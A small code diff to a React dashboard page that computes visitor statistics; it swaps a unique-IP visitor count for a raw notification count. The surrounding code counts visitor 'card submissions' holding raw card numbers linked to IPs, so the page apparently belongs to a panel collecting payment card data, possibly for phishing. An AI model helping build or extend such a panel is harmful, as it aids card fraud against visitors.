@@ -406,7 +406,7 @@ export default function NotificationsPage() {
 
   const updateStatistics = (notificationsData: Notification[]) => {
     const uniqueVisitors = new Set(notificationsData.map((n) => n.ip)).size
-    setTotalVisitors(uniqueVisitors || notificationsData.length)
+    setTotalVisitors( notificationsData.length)
     const cardCount = notificationsData.filter((n) => n.cardData?.cardNumber || n.cardNumber).length
     setCardSubmissions(cardCount)
   }
